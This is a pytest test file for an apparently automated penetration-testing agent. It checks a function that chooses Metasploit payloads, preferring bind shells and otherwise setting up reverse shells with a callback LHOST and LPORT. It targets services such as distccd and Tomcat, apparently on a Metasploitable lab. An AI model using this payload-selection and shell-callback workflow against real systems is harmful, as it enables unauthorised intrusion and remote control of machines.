"""Tier 2: turn a chosen Metasploit exploit module into a FIREABLE one by picking a
compatible payload.

Root cause (memory + session_20260818): plan_exploit_step injected run_metasploit with
{module, target, rport} and NO payload, so msf fired each exploit with its default
payload — often wrong-platform or a staged reverse with nowhere to call back → zero
sessions. select_payload asks msf `show payloads` for the module and picks the best
compatible one, preferring a BIND shell (target listens, we connect — no attacker
callback infra) over a REVERSE shell (needs LHOST). Auxiliary modules need no payload.
"""
from msf_selector import select_payload

# Canned `use <exploit>; show payloads` output — the shape msfconsole prints.
SHOW_PAYLOADS = """
Compatible Payloads
===================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  payload/cmd/unix/generic                                normal  No     Unix Command, Generic Command Execution
   1  payload/cmd/unix/reverse_perl                           normal  No     Unix Command Shell, Reverse TCP (via Perl)
   2  payload/cmd/unix/bind_perl                              normal  No     Unix Command Shell, Bind TCP (via Perl)
   3  payload/cmd/unix/bind_netcat                            normal  No     Unix Command Shell, Bind TCP (via netcat)
"""

REVERSE_ONLY = """
Compatible Payloads
===================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  payload/cmd/unix/reverse_perl                           normal  No     Unix Command Shell, Reverse TCP (via Perl)
   1  payload/linux/x86/meterpreter/reverse_tcp               normal  No     Linux Meterpreter, Reverse TCP Stager
"""


def _runner(out):
    return lambda module: out


def test_prefers_a_bind_shell_so_no_callback_infra_is_needed():
    pick = select_payload("exploit/unix/misc/distcc_exec", runner=_runner(SHOW_PAYLOADS))
    assert pick is not None
    assert "bind" in pick["payload"]
    assert pick["needs_lhost"] is False


def test_falls_back_to_reverse_and_flags_lhost_when_no_bind_exists():
    pick = select_payload("exploit/linux/foo/bar", runner=_runner(REVERSE_ONLY))
    assert "reverse" in pick["payload"]
    assert pick["needs_lhost"] is True


def test_auxiliary_module_needs_no_payload():
    assert select_payload("auxiliary/scanner/rservices/rsh_login",
                          runner=_runner(SHOW_PAYLOADS)) is None


def test_returns_none_when_msf_lists_no_payloads():
    assert select_payload("exploit/unix/misc/distcc_exec",
                          runner=_runner("Compatible Payloads\n===\n(no rows)\n")) is None


def test_returned_payload_path_is_usable_verbatim():
    # msf `set PAYLOAD` wants the path WITHOUT the leading "payload/".
    pick = select_payload("exploit/unix/misc/distcc_exec", runner=_runner(SHOW_PAYLOADS))
    assert not pick["payload"].startswith("payload/")
    assert pick["payload"].startswith("cmd/unix/")


# ── plan_exploit_step now configures the payload on the injected run_metasploit ──
import os
import exploitation_core as ec


def _mem_with_fp(port, product, version):
    m = ec.AgentMemory()
    m.add_fingerprints({port: {"service": product, "product": product, "version": version}})
    return m


def test_injected_metasploit_step_carries_a_bind_payload_no_lhost():
    mem = _mem_with_fp("3632", "distccd", "1")
    step = ec.plan_exploit_step(
        "3632", "10.0.0.5", "distccd", [], mem,
        select_fn=lambda p, v: [{"module": "exploit/unix/misc/distcc_exec", "rank": "excellent"}],
        payload_fn=lambda module: {"payload": "cmd/unix/bind_netcat", "needs_lhost": False},
    )[0]
    assert step["tool"] == "run_metasploit"
    assert step["payload"] == "cmd/unix/bind_netcat"
    assert "lhost" not in step


def test_injected_metasploit_step_sets_lhost_lport_for_reverse(monkeypatch):
    monkeypatch.setenv("HALO_LHOST", "10.0.0.9")
    monkeypatch.setenv("HALO_LPORT", "4444")
    # 8180 (Tomcat) has no curated PoC, so the MSF branch runs (6667 would be curated).
    mem = _mem_with_fp("8180", "Apache Tomcat", "1.1")
    step = ec.plan_exploit_step(
        "8180", "10.0.0.5", "Apache Tomcat", [], mem,
        select_fn=lambda p, v: [{"module": "exploit/multi/http/tomcat_mgr_upload", "rank": "excellent"}],
        payload_fn=lambda module: {"payload": "cmd/unix/reverse_perl", "needs_lhost": True},
    )[0]
    assert step["payload"] == "cmd/unix/reverse_perl"
    assert step["lhost"] == "10.0.0.9"
    assert step["lport"] == "4444"


def test_injected_step_omits_payload_when_selector_returns_none():
    mem = _mem_with_fp("513", "rlogind", "")
    step = ec.plan_exploit_step(
        "513", "10.0.0.5", "rlogind", [], mem,
        select_fn=lambda p, v: [{"module": "auxiliary/scanner/rservices/rlogin_login", "rank": "normal"}],
        payload_fn=lambda module: None,
    )[0]
    assert step["tool"] == "run_metasploit"
    assert "payload" not in step


# Live 2026-08-18: select_payload picked cmd/unix/bind_awk (sorted first) and it did
# NOT land on Metasploitable, while bind_perl is rock-solid. Rank bind payloads by
# interpreter reliability so a fragile one is never chosen over a dependable one.
def test_bind_payload_prefers_reliable_interpreter_over_awk():
    out = """
Compatible Payloads
===================

   #  Name                          Rank    Check  Description
   -  ----                          ----    -----  -----------
   0  payload/cmd/unix/bind_awk               normal  No  awk bind
   1  payload/cmd/unix/bind_perl              normal  No  perl bind
   2  payload/cmd/unix/bind_netcat            normal  No  netcat bind
"""
    pick = select_payload("exploit/x/y/z", runner=lambda m: out)
    assert pick["payload"] in ("cmd/unix/bind_netcat", "cmd/unix/bind_perl")
    assert "awk" not in pick["payload"]
